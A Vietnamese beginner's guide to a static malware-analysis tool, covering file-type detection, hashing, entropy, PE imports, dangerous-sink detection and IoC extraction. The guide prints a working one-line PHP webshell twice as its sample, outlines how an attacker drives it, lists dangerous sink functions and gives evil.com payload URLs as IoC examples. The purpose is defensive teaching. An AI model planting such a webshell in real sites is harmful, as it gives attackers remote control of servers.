# GIẢI THÍCH CHI TIẾT — HỆ THỐNG PHÂN TÍCH MÃ ĐỘC HOẠT ĐỘNG NHƯ THẾ NÀO

*Tài liệu này giải thích từng bước một, cho người chưa biết gì về bảo mật.*

---

## PHẦN 1: NGUYÊN LÝ CĂN BẢN

### 1.1. Mã độc (malware) là gì?

Mã độc là một đoạn chương trình được viết ra với mục đích xấu: đánh cắp dữ liệu,
chiếm quyền điều khiển máy, phá hoại, hoặc mã hóa tống tiền.

**Ví dụ đơn giản nhất — một webshell (con "vỏ ốc" độc giấu trong máy chủ web):**

```php
<?php
eval($_POST['cmd']);   // ← toàn bộ "vũ khí" chỉ gói trong 1 dòng này
?>
```

Giải thích từng chữ:
- `<?php ... ?>` — báo hiệu đây là mã PHP (ngôn ngữ chạy trên máy chủ web).
- `eval(...)` — lệnh "chạy thử chuỗi bên trong như một câu lệnh PHP". Nghĩa là: đưa gì vào, nó chạy cái đó.
- `$_POST['cmd']` — lấy dữ liệu người dùng gửi lên từ trình duyệt (`cmd` = command = lệnh).

**Hệ quả:** Kẻ tấn công mở trình duyệt, gửi lên máy chủ một "lệnh" (ví dụ xóa file,
xem mật khẩu). Máy chủ sẽ mù quáng thực thi, vì code viết sẵn `eval()` mà không kiểm tra ai gửi.

→ Đây chính là thứ hệ thống của chúng ta đi SĂN TÌM.

---

### 1.2. Phân tích tĩnh khác gì phân tích động?

Có 2 cách điều tra một mẫu đáng ngờ:

| | Phân tích TĨNH | Phân tích ĐỘNG |
|---|---|---|
| Cách làm | ĐỌC file, không chạy | CHẠY file trong lồng cách ly (sandbox) |
| Ví von | Mổ xác để khám bệnh | Bắt sống, tra hỏi hành vi |
| Ưu | An toàn, nhanh | Thấy hành vi thật |
| Nhược | Khó thấy mã tự giấu (packed) | Nguy hiểm, cần môi trường riêng |

**Hệ thống này dùng phân tích TĨNH** — chỉ "đọc" file, mổ xẻ cấu trúc bên trong,
tuyệt đối KHÔNG chạy nó nên không bao giờ bị lây nhiễm.

---

## PHẦN 2: HỆ THỐNG GỒM NHỮNG GÌ

### 2.1. Hai bộ phận

1. **Frontend** (giao diện web) — thứ ta bấm, kéo-thả file vào.
   Viết bằng HTML/CSS/JavaScript. Chạy trên GitHub Pages (miễn phí, tĩnh).

2. **Backend** (bộ não Python) — thứ thực sự đọc và phân tích file.
   Viết bằng Python + FastAPI. Chạy trên Render (miễn phí, động).

### 2.2. Vì sao cần 2 phần?

Vì trình duyệt (frontend) không đủ mạnh để đọc PE header, chạy YARA...
Nên file được gửi lên backend Python phân tích sâu, rồi trả kết quả về hiển thị.

### 2.3. Các module phân tích (file Python)

| File | Nhiệm vụ |
|---|---|
| `malware_analyzer.py` | Phân tích tổng hợp: hash, entropy, PE, IoC, phân loại họ |
| `yara_engine.py` | Nạp + biên dịch YARA rules, quét mẫu |
| `webshell_detector.py` | Regex + theo dõi luồng dữ liệu + phát hiện polyglot |
| `cvss_scoring.py` | Chấm điểm CVSS 3.1 + ánh xạ CWE + MITRE ATT&CK |
| `api_server.py` | FastAPI nhận file upload, gọi các module trên |

---

## PHẦN 3: 6 BƯỚC MỔ XẺ (GIẢI THÍCH CHI TIẾT NHẤT)

Khi đưa 1 file vào, hệ thống làm 6 việc tuần tự:

---

### BƯỚC 1 — Nhận diện "đây là loại file gì"

**Mục đích:** Biết đang đối mặt với cái gì để chọn đúng "dụng cụ" mổ xẻ.

**Cách làm:** Đọc **magic bytes** — vài byte đầu của file, là "chữ ký" nhận dạng loại file.

| Magic bytes (đầu file) | Ý nghĩa |
|---|---|
| `MZ` | File chạy Windows (.exe / .dll) |
| `<?php` | Mã PHP |
| `#!` | Shell script (Linux) |
| `PK` | File nén ZIP |
| `7fELF` | File chạy Linux (ELF) |
| `%PDF` | Tài liệu PDF |

**Chú thích đời thường:** Mọi file máy tính đều có vài byte đầu "khai báo" nó là gì.
`MZ` là viết tắt tên Mark Zbikowski (kỹ sư tạo ra định dạng PE).
Thấy `MZ` → biết ngay là file Windows → sẽ dùng công cụ đọc PE ở Bước 4.

---

### BƯỚC 2 — Băm mật mã (hash)

**Mục đích:** Lấy "dấu vân tay" duy nhất của file.

**Cách làm:** Cho toàn bộ nội dung chạy qua hàm băm (MD5, SHA-256, SHA-512)
→ ra một chuỗi ký tự độ dài cố định.

Ví dụ thật:
```
MD5:     b4222ff24fe7e5c52d5df6a984882dad
SHA-256: e629ed334ebb3597421a8053fdc8dfce36f5b726d011bd39fa421d6448f41579
```

**Tại sao hash quan trọng:**
- Hai file GIỐNG HỆT nhau → hash GIỐNG Y HỆT nhau.
- Chỉ sửa 1 ký tự → hash khác HOÀN TOÀN.
- Nên hash là "chứng minh thư" của file.

**Công dụng thực tế:** Lấy hash lên **VirusTotal** (web tra cứu miễn phí)
→ biết "hash này từng bị 60 phần mềm diệt virus phát hiện chưa".
Nếu có → kết luận ngay đây là mã độc đã biết.

---

### BƯỚC 3 — Đo Entropy

**Mục đích:** Phát hiện file có bị "nén/mã hóa" để che giấu không.

**Hiểu theo đời thường:**
- File văn bản / mã nguồn → chữ lặp lại, có trật tự → entropy THẤP (4–6).
- File nén (.zip) / mã hóa → byte "loạn" hết, không đoán được → entropy CAO (≈7–8).

**Chú thích:** Kẻ viết mã độc thường NÉN hoặc MÃ HÓA code (gọi là "pack")
để phần mềm diệt virus không đọc được.

Ví dụ: webshell đơn giản entropy 5.31 (thấp → mã đọc được bình thường),
nhưng file `upx_packed.exe` entropy 7.8 (cao → nghi bị pack).

---

### BƯỚC 4 — Mổ xẻ cấu trúc (bước hay nhất)

Chia 2 nhánh tùy loại file:

**Nhánh A — File Windows (.exe):** đọc PE header
- **Import Table** = danh sách hàm Windows mà file "mượn" dùng. Nếu thấy hàm nhạy cảm:
  - `CreateProcess` → mở chương trình khác
  - `socket` / `connect` → kết nối mạng ra ngoài
  - `VirtualAlloc` / `WriteProcessMemory` → tự nhét code vào tiến trình khác
  → Đây là hành vi mã độc, không phải phần mềm lành.
- **Section** (.text, .data...) + đo entropy từng section để phát hiện packer.

**Nhánh B — Script (PHP/Python...):** đọc mã nguồn, tìm "lệnh sink" (điểm nguy hiểm):
- `eval`, `system`, `shell_exec`, `exec` → thực thi lệnh
- `base64_decode`, `gzinflate` → giải mã thứ đang bị giấu
- `fsockopen`, `socket` → kết nối mạng

**Chú thích về "data flow" (theo dõi luồng dữ liệu):**
Hệ thống không chỉ tìm lệnh nguy hiểm đơn lẻ, mà còn THEO DÕI DÒNG CHẢY:
dữ liệu từ người dùng (`$_POST`) → đi qua giải mã → đổ vào hàm nguy hiểm (`eval`).
Đủ chuỗi này mới kết luận nguy hiểm thật (tránh báo nhầm file chỉ tình cờ chứa chữ "eval").

---

### BƯỚC 5 — Trích xuất IoC (dấu vết xâm nhập)

**Mục đích:** Tìm địa chỉ máy chủ điều khiển (C2) mà mã độc kết nối về.

**Cách làm:** Dùng regex (công cụ tìm mẫu chuỗi) quét nội dung, bắt:
- **IP**: `192.168.1.50`
- **URL**: `http://evil.com/payload.exe`
- **Domain**: `evil.com`

**Chú thích:** Mã độc thường "gọi điện về tổng hành dinh" của hacker (C2 = Command & Control).
Tìm được địa chỉ này → chặn ở tường lửa → cắt liên lạc + truy vết hacker.

Ví dụ: webshell đơn giản KHÔNG có IoC (tấn công trực tiếp, không cần C2).
Nhưng PowerShell downloader có IoC: `http://evil.com/payload.ps1`.

---

### BƯỚC 6 — Kết luận

Tổng hợp 5 bước để phán quyết cuối:
- Tìm thấy lệnh sink + nguồn input + (có thể) IoC → **MÃ ĐỘC**, gán họ (webshell, RAT...).
- Ánh xạ **MITRE ATT&CK** (bảng chuẩn toàn cầu phân loại chiến thuật/kỹ thuật tấn công):
  - webshell = T1505.003, command execution = T1059.
- Gán **CWE** (mã lỗi bảo mật): ví dụ CWE-94 = lỗi "thực thi mã".
- Chấm **CVSS** (điểm nghiêm trọng 0–10): reverse shell = 10.0 (cao nhất).

---

## PHẦN 4: BẢNG TÓM TẮT 1 CÂU CHO TỪNG BƯỚC

| Bước | Câu dễ hiểu |
|---|---|
| 1. Nhận diện | "Đây là file gì?" (đọc chữ ký đầu file) |
| 2. Hash | "Lấy dấu vân tay để tra danh tiếng" |
| 3. Entropy | "Có bị nén/mã hóa để giấu không?" |
| 4. Mổ xẻ | "Nó gọi hàm gì, chạy lệnh gì nguy hiểm?" |
| 5. IoC | "Nó liên lạc với máy hacker nào?" |
| 6. Kết luận | "Tóm lại: có độc không, độc cỡ nào?" |

---

## PHẦN 5: VÍ DỤ MỔ XẺ 1 FILE CỤ THỂ

Giả sử hệ thống nhận file `shell.php`:

```php
<?php
@eval($_POST['cmd']);
?>
```

| Bước | Kết quả hệ thống trả về | Giải nghĩa |
|---|---|---|
| 1 | `PHP script` | Đầu file là `<?php` → là mã PHP |
| 2 | MD5 `b4222ff2...` | Dấu vân tay của file |
| 3 | Entropy 5.31 | Thấp → mã đọc được, không giấu gì |
| 4 | Lệnh sink: `eval()` + input `$_POST` | Có eval chạy dữ liệu người dùng gửi lên |
| 5 | Không có IoC | Tấn công trực tiếp, không cần C2 |
| 6 | **MÃ ĐỘC** — Webshell, CWE-94, T1505.003 | Kết luận: backdoor nguy hiểm |

**Cách hacker khai thác file này:**
1. Hacker mở trình duyệt, gửi yêu cầu tới `shell.php` với tham số `cmd`.
2. Server nhận `cmd`, ném vào `eval()`.
3. `eval()` chạy lệnh đó → hacker điều khiển được server từ xa.